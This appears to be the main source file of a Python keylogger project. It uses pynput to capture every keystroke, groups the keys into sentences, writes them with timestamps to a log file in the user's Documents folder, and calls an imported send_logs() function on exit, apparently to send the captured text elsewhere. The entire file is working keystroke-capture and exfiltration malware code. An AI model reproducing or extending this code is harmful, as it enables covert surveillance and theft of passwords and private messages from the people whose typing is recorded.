# Import required modules
import logging
import os
from pynput import keyboard
from client import send_logs

# Path to directory for storing keylogs - User home (~) directory
home_dir = os.path.expanduser("~")
log_file = os.path.join(home_dir, "Documents", "python project", "key_log.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

current_sentence = ""

# Event - A key is pressed
def on_press(key):
    global current_sentence
    
    try:
        # Add regular character to buffer
        current_sentence += key.char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            current_sentence += " "
        elif key == keyboard.Key.enter:
            # Log the complete sentence when Enter is pressed
            if current_sentence:
                logging.info(current_sentence)
                current_sentence = ""  # Reset buffer
        elif key == keyboard.Key.backspace:
            # Remove last character
            current_sentence = current_sentence[:-1]
        elif key == keyboard.Key.tab:
            current_sentence += "\t"

# Event - A key is released
def on_release(key):    
    # If ESC key was pressed and released, then
    if key == keyboard.Key.esc:
        # Log any remaining text before stopping
        if current_sentence:
            logging.info(current_sentence)
        # Stop the listener
        send_logs()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()